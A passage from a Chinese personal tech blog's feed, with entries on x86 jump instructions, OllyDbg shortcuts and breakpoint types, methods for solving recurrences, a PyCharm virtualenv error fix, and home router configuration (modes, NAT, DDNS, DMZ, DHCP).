class="line"></span><br><span class="line">JP          ;奇偶位置位则跳转</span><br><span class="line">JNP         ;奇偶位清除则跳转</span><br><span class="line">JPE         ;奇偶位相等则跳转</span><br><span class="line">JPO         ;奇偶位不等则跳转</span><br></pre></td></tr></table></figure><h1 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h1><p>文件偏移地址 = 虚拟内存地址(VA)-装载基址(Image Base)-节偏移</p>]]></content>
    
    
    <summary type="html">系统底层的学习记录</summary>
    
    
    
    
    <category term="汇编" scheme="https://xchens.cn/tags/%E6%B1%87%E7%BC%96/"/>
    
  </entry>
  
  <entry>
    <title>olldbg 手册</title>
    <link href="https://xchens.cn/posts/8e260842/"/>
    <id>https://xchens.cn/posts/8e260842/</id>
    <published>2018-11-12T04:48:00.000Z</published>
    <updated>2021-11-18T09:10:51.142Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ollydbg快捷键："><a href="#ollydbg快捷键：" class="headerlink" title="ollydbg快捷键："></a>ollydbg快捷键：</h1><p>F2——下断点，也就是指定断点的地址；</p><p>F3——加载一个可执行程序，进行调试分析；</p><p>F4——程序执行到光标处；</p><p>F5——缩小还原当前窗口；</p><p>F7——单步步入；</p><p>F8——单步步过；（Ctrl+F8可以自动步过并设置断点）</p><p>F9——直接运行程序，遇到断点处，程序暂停；</p><p>Ctrl+F2——重新运行程序到起始处，一般用于重新调试程序；</p><p>Ctrl+F9——执行到函数返回处，用于跳出函数实现；</p><p>Alt+F9——执行到用户代码处，用于快速跳出系统函数；</p><p>Ctrl+G——输入十六进制地址，快速定位到该地址处；</p><p>Ctrl+F——查找命令</p><p>Ctrl+S——查找命令序列(通过any(命令)和r32(32位寄存器)实现模糊查找)</p><p>Ctrl+B——查找二进制串(使用?作为模糊查找)</p><p>在遇到call或jmp指令时按下Enter键，可以去其目标地址查看，但暂不直接进入执行(静态查看)</p><h2 id="断点"><a href="#断点" class="headerlink" title="断点"></a>断点</h2><h3 id="软件断点"><a href="#软件断点" class="headerlink" title="软件断点"></a>软件断点</h3><p>最为常用的普通断点。分为普通操作（鼠标点击设置断点）和命令操作。</p><p>命令操作：bp创建断点，bc删除断点，可以指定api函数并设置偏移量。<br>如 <code>bp CreateFileA</code> 以及 <code>bp CreateFile + 5</code></p><p>note:</p><ol><li>软件断点只能在代码上设置。</li><li>软件断点可以在代码的任意位置上设置，并且断点的数量不受限制。</li></ol><h3 id="硬件断点"><a href="#硬件断点" class="headerlink" title="硬件断点"></a>硬件断点</h3><p>硬件断点依赖CPU中的调试寄存器。调试寄存器一共有8个，其中4个用于设置断点，因此断点数量只有4个。  </p><p>硬件断点可以用右键菜单也可以用命令进行设置。</p><ol><li><p>菜单操作</p><p> 在CPU的反汇编窗口或数据窗口单击鼠标右键，在弹出菜单内找到”断点”菜单项可以看到相应的设置硬件断点的子菜单项。<br> 断点类型分为 硬件访问、硬件写入、硬件执行</p></li><li><p>命令操作</p><p> 分为HE, HW, HR, HD。<br> 其中HE表示硬件执行断点，HW和HR分别表示硬件写和硬件读断点。<br> HD表示删除断点。</p></li></ol><h3 id="内存断点"><a href="#内存断点" class="headerlink" title="内存断点"></a>内存断点</h3><p>获知某块内存中的数据是在什么情况下被写入或访问的。</p><p>在反汇编窗口或数据窗口中单击鼠标右键，在弹出的菜单项里选择”断点”。<br>内存断点分为 <strong>内存访问</strong> 与 <strong>内存写入</strong> 两种方式。</p><p>在内存窗口(按Alt + M可以切换到内存窗口)选择某个内存块，单击鼠标右键，在弹出的菜单中可以进行设置”设置内存访问窗口”，”设置内存写入断点”。</p><p>note: OD只可以设置一个内存断点，再设置新的内存断点时会自动删除之前的内存断点。</p><h3 id="一次性内存访问断点"><a href="#一次性内存访问断点" class="headerlink" title="一次性内存访问断点"></a>一次性内存访问断点</h3><p>类似与内存断点，区别在于在中断后会自行删除</p><h3 id="条件断点"><a href="#条件断点" class="headerlink" title="条件断点"></a>条件断点</h3><h4 id="1-条件断点"><a href="#1-条件断点" class="headerlink" title="1.条件断点"></a>1.条件断点</h4><p>在需要设置条件断点的位置按下 <strong>shift + F2</strong> ，在弹出的条件对话框中输入条件。也可以在命令插件中直接输入条件，两者的方式是类似的。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">+, -, &amp;&amp;, ||, !, &gt;, &gt;=, &lt;, &lt;=, ==, !=</span><br></pre></td></tr></table></figure><p>条件示例</p><blockquote><p>EAX == 12345678  表示EAX寄存器等于12345678<br>[EAX] == 12345678  表示EAX寄存器中保存的值是一个内存地址，内存地址中的值等于12345678<br>[[EAX]] == 12345678  表示EAX中内存地址指向的内存地址的值是12345678<br>ESI==0040300 &amp;&amp; EDI==00403010  表示ESI寄存器的值为0040300且EDI寄存器的值为00403010<br>[403000] != 10  表示内存地址403000的值不等于10<br>STRING[403010] == “test”  表示以地址403010为起始地址，以NULL作为结尾的ASCII字符串<br>[STRING[403010]] == “test”  表示以地址403010作为起始地址，开头为test的字符串</p></blockquote><p>如命令 bp LoadLibrary [STRING[esp+4]]==”kernel32.dll”</p><h4 id="2-条件记录断点"><a href="#2-条件记录断点" class="headerlink" title="2.条件记录断点"></a>2.条件记录断点</h4><p>在需要设置条件记录断点的地址上按下 “shift+F4”。会弹出条件记录断点的对话框。</p><h3 id="消息断点"><a href="#消息断点" class="headerlink" title="消息断点"></a>消息断点</h3><p>用于调试带有窗口的应用程序。</p><p>消息断点在”window窗口”中设置(单击工具栏上的”W”按钮即可切换到window窗口)。当切换到window窗口后，首先单击右键弹出菜单中的刷新按钮，便于能正常显示所有的窗口。选中要设置断点的窗口记录，然后在右键弹出的菜单当中，选择”在CLassProc设置消息断点”</p>]]></content>
    
    
    <summary type="html">介绍od常用命令，快捷键，调试知识点等</summary>
    
    
    
    
    <category term="工具" scheme="https://xchens.cn/tags/%E5%B7%A5%E5%85%B7/"/>
    
    <category term="olldbg" scheme="https://xchens.cn/tags/olldbg/"/>
    
  </entry>
  
  <entry>
    <title>求解递归式的基本方法</title>
    <link href="https://xchens.cn/posts/2d3132fd/"/>
    <id>https://xchens.cn/posts/2d3132fd/</id>
    <published>2018-11-07T15:06:00.000Z</published>
    <updated>2021-11-18T09:10:51.142Z</updated>
    
    <content type="html"><![CDATA[<h1 id="递归式"><a href="#递归式" class="headerlink" title="递归式"></a>递归式</h1><p>一个递归式就是一个等式或不等式，<br>它通过更小的输入上的函数值来描述一个函数。<br>例如:<br><img src="https://xchens-1254410906.cos.ap-shanghai.myqcloud.com/assets/images/dts_exp.png" alt="递归式样例"></p><h2 id="一、代入法"><a href="#一、代入法" class="headerlink" title="一、代入法"></a>一、代入法</h2><ol><li><p>猜测解的形式。  </p></li><li><p>用数学归纳法求出解中的常数，并证明解是正确的。  </p></li></ol><h3 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h3><h4 id="一般解法"><a href="#一般解法" class="headerlink" title="一般解法"></a>一般解法</h4><p>求解: T(n) = T(n-1) + n  </p><pre><code>假设其解为O(n^2)，即 T(n) = O(n^2)代入法要求: 证明选择常数 c&gt;0 ，可得 T(n) ≤ c*n^2    假设对于 m&lt;n ，总有 T(m) ≤ c*m^2    即 T(n-1) ≤ c*(n-1)^2    那么    T(n) ≤ c*(n-1)^2 + n        ≤ c*n^2 - c*2n + c + n        ≤ c*n^2 - (c*2n - c -n)        ≤ c*n^2 - ((n-1)c + (c-1)n)    由于 n&gt;1 &amp;&amp; c&gt;0 则 ((n-1)c + (c-1)n) &gt; 0    故 T(n) ≤ c*n^2    得 T(n) = O(n^2)</code></pre><h4 id="变形的换元解法"><a href="#变形的换元解法" class="headerlink" title="变形的换元解法"></a>变形的换元解法</h4><p>求解： <img src="https://xchens-1254410906.cos.ap-shanghai.myqcloud.com/assets/images/dts_exp2.png" alt="递归式换元题"></p><pre><code>这里可以假设n开方后是整数。令 m=lgn得到    T(2^m) = 2T(2^(m/2)) + m使 S(m) = T(2^m), 则    S(m) = 2S(m/2) + m这里的递归式S(m)就可以使用与上面相同的解法。    猜测 S(m) = O(mlgm)， 即存在常数c&gt;0,可得 S(m) ≤ cmlgm    假设c&gt;0时对于任意的 a&lt;m 都有S(a) ≤ calga    则 S(m/2) ≤ c(m/2)lg(m/2)    S(m) ≤ 2c(m/2)lg(m/2) + m         ≤ cmlgm - m(c-1)         ≤ cmlgm    所以 S(m) = O(mlgm)T(n)=T(2^m)=S(m)=O(mlgm)=O(lgn*lglgn)</code></pre><h2 id="二、递归树法"><a href="#二、递归树法" class="headerlink" title="二、递归树法"></a>二、递归树法</h2><p>虽然可以用代入法简洁的证明一个解是递归式的正确解，但想出一个好的猜测可能并不容易。画出递归树是设计好的猜测的一种简单而直接的方法。</p><p>在递归树中，每个结点代表一个单一子问题的代价，子问题对应某次递归函数调用。我们将树中每层中的代价求和，得到每层代价。再将所有层中的代价求和，得到递归调用总代价。</p><h3 id="例"><a href="#例" class="headerlink" title="例"></a>例</h3><p>我们以<img src="https://xchens-1254410906.cos.ap-shanghai.myqcloud.com/assets/images/dts_exp3.png" alt="递归式3">为例。<br>如下图显示了构造递归树的必要步骤，为方便起见，假定n是4的幂。</p><p><img src="https://xchens-1254410906.cos.ap-shanghai.myqcloud.com/assets/images/dgs_abc.png" alt="abc"><br><img src="https://xchens-1254410906.cos.ap-shanghai.myqcloud.com/assets/images/dgs_d.png" alt="d">  </p><p>递归树法存在一定误差，需要注意</p><h2 id="三、主方法"><a href="#三、主方法" class="headerlink" title="三、主方法"></a>三、主方法</h2><p>主方法为如下形式的递归式提供了特别的解法<br>    ** T(n) = aT(n/b) + f(n) **<br>其中a,b是常数， a≥1, b&gt;1,f(n)是渐近正函数</p><p>主方法依赖这些<a href="https://zh.wikipedia.org/wiki/%E4%B8%BB%E5%AE%9A%E7%90%86">定理</a></p><h3 id="主方法概括"><a href="#主方法概括" class="headerlink" title="主方法概括"></a>主方法概括</h3><p>比较 <img src="https://xchens-1254410906.cos.ap-shanghai.myqcloud.com/assets/images/nlogba.png" alt="nlogba"> 和 f(n)，如果f(n)的复杂度较大，T(n)=O(f(n)),如果f(n)的复杂度较小，则T(n)=O(<img src="https://xchens-1254410906.cos.ap-shanghai.myqcloud.com/assets/images/nlogba.png" alt="nlogba">)。<br>而若二者相等，则T(n)=O(<img src="https://xchens-1254410906.cos.ap-shanghai.myqcloud.com/assets/images/nlogba.png" alt="nlogba"> * lgn)</p><h3 id="举例"><a href="#举例" class="headerlink" title="举例"></a>举例</h3><blockquote><p>T(n) = 7T(n/2) + O(n^2)</p></blockquote><p>这里有a=7,b=2,f(n)=n^2。<br>因此 <img src="https://xchens-1254410906.cos.ap-shanghai.myqcloud.com/assets/images/nlogba.png" alt="nlogba"> &gt; f(n)<br>则 T(n) = O(n ^ (lg 7))</p><h2 id="the-end"><a href="#the-end" class="headerlink" title="the end"></a>the end</h2><p>欢迎友善交流。</p>]]></content>
    
    
    <summary type="html">递归式的一般解法</summary>
    
    
    
    
    <category term="算法" scheme="https://xchens.cn/tags/%E7%AE%97%E6%B3%95/"/>
    
  </entry>
  
  <entry>
    <title>给pycharm设置虚拟环境virtualenv</title>
    <link href="https://xchens.cn/posts/85ec9c9c/"/>
    <id>https://xchens.cn/posts/85ec9c9c/</id>
    <published>2018-11-04T10:30:00.000Z</published>
    <updated>2021-11-18T09:10:51.142Z</updated>
    
    <content type="html"><![CDATA[<h1 id="给pycharm设置虚拟环境virtualenv"><a href="#给pycharm设置虚拟环境virtualenv" class="headerlink" title="给pycharm设置虚拟环境virtualenv"></a>给pycharm设置虚拟环境virtualenv</h1><h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><p>每次在给pycharm的项目新建一个虚拟环境时，总会在保存的时候报错”please sperify a different sdk name”。  </p><h2 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h2><p>关于pycharm报错”please sperify a diffrent sdk name”这个问题，实在是困扰我太久太久了。<br>无数次我把虚拟环境删了建，建了删，甚至直接新建一个空项目都不行，这一度让我对pycharm极其愤怒~~。  </p><p>每次遇到去网上搜，都是千篇一律的答案。说是让我给新建的虚拟环境换个名字。可我差点没把系统重装了。<br>真的不可能有重名了，于是一次次的，想可能绕弯子的方法，比如新建好带有虚拟环境的项目，再把代码文件复制到这个项目里。<br>但总有绕不过去的时候呀~~</p><p>不过这次我花了大把时间总算解决了，以此文纪念一下我那蛋疼的青春。</p><h2 id="bug"><a href="#bug" class="headerlink" title="bug"></a>bug</h2><p>没错，这就是 <strong>bug</strong> 。</p><h2 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h2><p>删除文件 <strong>jdk.table.xml</strong> 。</p><p>linux下位于 <strong>~/Library/Preferences/PyCharm2018.1/options/jdk.table.xml</strong> 。</p><p>windows下位于 <strong>C:\Users\Username.PyCharm2018.2\config\options\jdk.table.xml</strong> 。</p><p>删除后重启即可</p><h2 id="怎么找到解决方案的"><a href="#怎么找到解决方案的" class="headerlink" title="怎么找到解决方案的"></a>怎么找到解决方案的</h2><p>官网！！！</p><p>不要沉迷于CSDN，segmentfault这样的中文解决方案，很多bug可能很多人都遇到过。<br>官网才是最好最直接的方式。  </p><p>努力学英语！</p><h2 id="the-end"><a href="#the-end" class="headerlink" title="the end"></a>the end</h2><p>参考：</p><blockquote><p><a href="https://intellij-support.jetbrains.com/hc/en-us/community/posts/360000306410/comments/360000158010">本文解决方案来源</a><br><a href="https://youtrack.jetbrains.com/issue/PY-27251">bug issue</a>  </p></blockquote>]]></content>
    
    
    <summary type="html">解决pycharm在给项目新建虚拟环境时报错&quot;please sperify a different sdk name&quot;</summary>
    
    
    
    
    <category term="教程" scheme="https://xchens.cn/tags/%E6%95%99%E7%A8%8B/"/>
    
    <category term="pycharm" scheme="https://xchens.cn/tags/pycharm/"/>
    
    <category term="virtualenv" scheme="https://xchens.cn/tags/virtualenv/"/>
    
  </entry>
  
  <entry>
    <title>关于路由器的配置</title>
    <link href="https://xchens.cn/posts/74d8cbbb/"/>
    <id>https://xchens.cn/posts/74d8cbbb/</id>
    <published>2018-10-29T02:16:00.000Z</published>
    <updated>2021-11-18T09:10:51.142Z</updated>
    
    <content type="html"><![CDATA[<h1 id="路由器的配置方法"><a href="#路由器的配置方法" class="headerlink" title="路由器的配置方法"></a>路由器的配置方法</h1><h2 id="了解路由器的基本信息"><a href="#了解路由器的基本信息" class="headerlink" title="了解路由器的基本信息"></a>了解路由器的基本信息</h2><p>路由器（英语：Router，又称路径器）是一种电讯网络设备，提供路由与转送两种重要机制，可以决定数据包从来源端到目的端所经过的路由路径（host到host之间的传输路径），这个过程称为路由；将路由器输入端的数据包移送至适当的路由器输出端（在路由器内部进行），这称为转送。路由工作在OSI模型的第三层——即网络层，例如网际协议（IP）。</p><h2 id="配置路由器"><a href="#配置路由器" class="headerlink" title="配置路由器"></a>配置路由器</h2><h3 id="模式"><a href="#模式" class="headerlink" title="模式"></a>模式</h3><p>路由的几种基本模式：</p><h4 id="AP（接入点）模式"><a href="#AP（接入点）模式" class="headerlink" title="AP（接入点）模式"></a>AP（接入点）模式</h4><p>AP(接入点)模式下，只需要把一根可以上网的网线插在路由器上，无需任何配置就可以上网了；但需要注意这时候路由器上的无线网络未加密，建议设置一个无线密码。<br>在此模式下，该设备相当于一台无线HUB，可实现无线之间、无线到有线、无线到广域网络的访问。最常见的能够提供无线客户端的接入，例如：无线网卡接入等。<br>具体设置步骤：该产品出厂默认是AP模式，用网线将设备与宽带接口连接，搜索该设备的无线信号进行连接，把无线IP地址改为自动获取即可（一般情况下，宽带路由器提供分配IP地址功能，DHCP）。<br>多数单纯性无线AP本身不具备路由功能，包括DNS、DHCP、Firewall在内的服务器功能都必须有独立的路由或是计算机来完成。目前大多数的无线AP都支持多用户（30-100台电脑）接入，数据加密，多速率发送等功能，在家庭、办公室内，一个无线AP便可实现所有电脑的无线接入。<br>AP即可以和无线网卡建立无线连接，也可以和有线网卡通过网线建立有线连接。<br>在这种模式下，无线1到13。选择中应该注意的是，如果周围环境中还有其他的无线网络，尽量不要与它使用相同的频率段。<br>同时注意开启无线功能，就是不要选中‘关闭无线功能’的这个选项即可。选中‘Access Point’选项，设置好SSID号即可。注意，通过无线方式与我们的无线AP建立连接的无线网卡上设置的SSID号必需与我们无线AP上设置的SSID号相同，否则无法接入网络。</p><p>适用场所：例如宾馆、酒店或者其它提供了一根网线上网的场所。</p><h4 id="Router-无线路由-模式"><a href="#Router-无线路由-模式" class="headerlink" title="Router(无线路由)模式"></a>Router(无线路由)模式</h4><p>在Router(无线路由)模式下，192.168.1.253路由器就相当于一台普通的无线宽带路由器；需要连接ADSL Modem（猫）或者光猫等设备来进行配置。</p><p>适用场所：用户自己办理了宽带业务情况下使用。</p><h4 id="Repeater（中继）模式"><a href="#Repeater（中继）模式" class="headerlink" title="Repeater（中继）模式"></a>Repeater（中继）模式</h4><p>Repeater（中继）模式下，192.168.1.253路由器会通过无线的方式与一台可以上网的无线路由器建立连接，用来放大可以上网的无线路由器上的无线信号；<br>注意：放大后的无线信号的名称和原来的无线路由器的无线信号名称一致。</p><p>适用场所：有一台可以上网的无线路由器，但是该无线路由器的无线信号覆盖有线，希望无线信号可以覆盖更广泛的范围时使用。</p><h4 id="Bridge（桥接）模式"><a href="#Bridge（桥接）模式" class="headerlink" title="Bridge（桥接）模式"></a>Bridge（桥接）模式</h4><p>Bridge（桥接）模式，192.168.1.253路由器会通过无线的方式与一台可以上网的无线路由器建立连接，用来放大可以上网的无线路由器上的无线信号；<br>注意：放大后的无线信号的名称和原来的无线路由器的无线信号名称不一样。</p><p>适用场所：有一台可以上网的无线路由器，但是该无线路由器的无线信号覆盖有线，希望无线信号可以覆盖更广泛的范围时使用。<br><img src="https://xchens-1254410906.cos.ap-shanghai.myqcloud.com/assets/images/set_wlan_bridge.png" alt="set_wlan_bridge"></p><h4 id="Client（客户端）模式"><a href="#Client（客户端）模式" class="headerlink" title="Client（客户端）模式"></a>Client（客户端）模式</h4><p>Client（客户端）模式下，192.168.1.253路由器相当于一块无线网卡，用来接收其它无线路由器上的无线信号；电脑只能够通过网线连接到192.168.1.253路由器上使用。</p><p>适用场所：附近有无线信号，并且用户知道该无线信号密码，用户的台式电脑想连接该无线信号上网时使用。</p><h3 id="NAT"><a href="#NAT" class="headerlink" title="NAT"></a>NAT</h3><p>NAT（Network Address Translation， 网络地址转换）是1994年提出的。当在专用网内部的一些主机本来已经分配到了本地IP地址(即 仅在本专用网内使用的专用地址)，但现在又想和因特网上的主机通信(并不需要加密)时，可使用NAT方法。</p><p>这种方法需要在专用网连接到因特网的路由器上安装NAT软件。装有NAT软件的路由器叫做NAT路由器，它至少有一个有效的外部全球IP 地址。这样，所有使用本地地址的主机在和外界通信时，都要在NAT路由器上将其本地地址转换成全球IP地址，才能和因特网连接。</p><p>NAT的实现方式有三种，即静态转换Static Nat、动态转换Dynamic Nat 和端口多路复用OverLoad。</p><p>静态转换是指将内部网络的私有IP地址转换为公有IP地址，IP地址对是一对一的，是一成不变的，某个私有IP地址只转换为某个公有IP地 址。借助于静态转换，可以实现外部网络对内部网络中某些特定设备（如服务器）的访问。</p><p>动态转换是指将内部网络的私有IP地址转换为公用IP地址时，IP地址是不确定的，是随机的，所有被授权访问上Internet的私有IP地址可 随机转换为任何指定的合法IP地址。也就是说，只要指定哪些内部地址可以进行转换，以及用哪些合法地址作为外部地址时，就可以进行 动态转换。动态转换可以使用多个合法外部地址集。当ISP提供的合法IP地址略少于网络内部的计算机数量时。可以采用动态转换的方式。</p><p>端口多路复用（Port address Translation,PAT)是指改变外出数据包的源端口并进行端口转换，即端口地址转换（PAT，Port Address Translation).采用端口多路复用方式。内部网络的所有主机均可共享一个合法外部IP地址实现对Internet的访问，从而可以最大限度地节 约IP地址资源。同时，又可隐藏网络内部的所有主机，有效避免来自internet的攻击。因此，目前网络中应用最多的就是端口多路复用方式。</p><p>也可以手工的进行端口映射：<br><img src="https://xchens-1254410906.cos.ap-shanghai.myqcloud.com/assets/images/set_port_map.png" alt="set_port_map"></p><h3 id="DDNS"><a href="#DDNS" class="headerlink" title="DDNS"></a>DDNS</h3><p>DDNS英文全称Dynamic Domain Name Server，中文含义是指动态域名服务。很多普通路由器或者智能路由器设置中，都可以找到DDNS（动态DNS）功能。</p><p>通俗的说，DDNS是将用户的动态IP地址映射到一个固定的域名解析服务上，用户每次连接网络的时候客户端程序就会通过信息传递把该主机的动态IP地址传送给位于服务商主机上的服务器程序，服务器程序负责提供DNS服务并实现动态域名解析。</p><p>如果觉得这样还不好理解的话，可以简单这样理解。目前路由器拨号上网获得的多半是动态IP,DDNS可以将路由器变化的外网IP和固定的域名绑定，从而用户可以在外网通过该固定域名进行访问路由器。</p><h4 id="DDNS有什么用？"><a href="#DDNS有什么用？" class="headerlink" title="DDNS有什么用？"></a>DDNS有什么用？</h4><p>1、目前ISP网络运营商大多提供动态IP（如拨号上网），我们若想在互联网上以自己的网域公布，DDNS提供了解决方案，它可以自动更新用户每次变化的浮动IP，然后将其与网域相对应，这样其他上网用户就可以通过域名访问您的路由器。</p><p>2、DDNS还可以让我们在自己的或家里架设WEB\MAIL\FTP等服务器，而不用花钱去付虚拟主机租金，也就是说，借助路由器DDNS绑定域名，可以将我们电脑作为服务器功能来使用，通过域名，可以让全球其他联网用户，访问我们指定的文件或者网页程序。</p><p>3、主机是自己的，空间可根据自己的硬盘需求来扩充，维护也比较方便。有了域名与空间，借助DDNS绑定域名就可以架设网站，FTP 服务器、EMAIL服务器都不成问题。</p><p>4、如果您有对VPN的需求，有了DDNS就可以用普通上网方式方便地建立Tunnel。透过网域的方式连结，实现远端管理、远端存取、远端打印等功能。</p><h4 id="DDNS设置方法"><a href="#DDNS设置方法" class="headerlink" title="DDNS设置方法"></a>DDNS设置方法</h4><p><img src="https://xchens-1254410906.cos.ap-shanghai.myqcloud.com/assets/images/set_DDNS.png" alt="set_DDNS"><br>如图所示，需要配置好提供DDNS的服务商及其账户密码,然后检测连接状态，一般在服务提供商的文档中会详细介绍这一点。  </p><h3 id="静态ip"><a href="#静态ip" class="headerlink" title="静态ip"></a>静态ip</h3><p>静态IP 地址（又称固定IP地址）是长期分配给一台计算机或网络设备使用的IP 地址。<br>设置方法：在路由器中将打算设置的IP地址与目标主机绑定。<br>tips: <a href="#%E6%9F%A5%E7%9C%8B%E4%B8%BB%E6%9C%BAmac%E7%89%A9%E7%90%86%E5%9C%B0%E5%9D%80">查看主机mac(物理地址)的方法</a><br><img src="https://xchens-1254410906.cos.ap-shanghai.myqcloud.com/assets/images/set_static_ip.png" alt="set_static_ip">  </p><h3 id="DMZ"><a href="#DMZ" class="headerlink" title="DMZ"></a>DMZ</h3><p>DMZ是全称叫做Demilitarized Zone，又叫做隔离区，也就是隔离内网和外网的一道屏障。因为现在网络病毒和攻击太猖獗了，于是需要组件一个相对于外网的内网系统。外网是非安全的可能受到攻击，内网则是相对安全一些，因为有防火墙的保护。但是问题又来了，有了防火墙之后，安全访问机制会让内网里面的机器能够正常访问外部网络，外部的设备却没法访问内网里面的服务器了。这也就是所谓的单向通信机制。  </p><p>配置在DMZ中的主机完全无视无线路由器防火墙的规则，可以直接与互联网上的主机进行双向通讯，用另一种说法就是DMZ主机就是一个开放所有端口的虚拟服务器。  </p><p>启用DMZ后就可以将指定主机暴露在公网上了。<br><img src="https://xchens-1254410906.cos.ap-shanghai.myqcloud.com/assets/images/set_DMZ.png" alt="set_DMZ">  </p><h3 id="DHCP"><a href="#DHCP" class="headerlink" title="DHCP"></a>DHCP</h3><p>DHCP (Dynamic Host Configuration Protocol，动态主机配置协议)服务能自动为网络客户机的TCP/IP分配IP地址、子网掩码、默认网关以及DNS服务器和WINS服务器的IP地址。<br>它能使网络管理员不用前往现场就能对每台计算机上的TCP/IP参数进行配置，一切设置的修改直接在服务器上即可完成。 DHCP 避免了因手工设置IP地址及子网掩码所产生的错误，同时也避免了把一个IP地址分配给多台计算机所造成的地址冲突，而客户机也只需将TCP/IP配置全设置为自动获取即可上网。  DHCP服务降低了管理IP地址设置的负担，使用DHCP 服务器大大缩短了配置或重新配置网络中工作站所花费的时间，达到了最高效地利用有限的IP地址的目的。 由于包含IP地址的相关TCP/IP配置参数是DHCP服务器“临时发放”给客户端使用的，所以当客户机断开与服务器的连接后，旧的IP地址将被释放以便重用。</p><hr><h3 id="附录"><a href="#附录" class="headerlink" title="附录"></a>附录</h3><h4 id="查看主机mac-物理地址"><a href="#查看主机mac-物理地址" class="headerlink" title="查看主机mac(物理地址)"></a>查看主机mac(物理地址)</h4><p>win下打开cmd终端，输入 <code>ipconfig /all</code><br><img src="https://xchens-1254410906.cos.ap-shanghai.myqcloud.com/assets/images/get_pc_mac.png" alt="get_pc_mac">  </p>]]></content>
    
    
    <summary type="html">路由器配置方法</summary>
    
    
    
    
    <category term="教程" scheme="https://xchens.cn/tags/%E6%95%99%E7%A8%8B/"/>
    
    <category term="路由器" scheme="https://xchens.cn/tags/%E8%B7%AF%E7%94%B1%E5%99%A8/"/>
    
  </entry>
  
</feed>
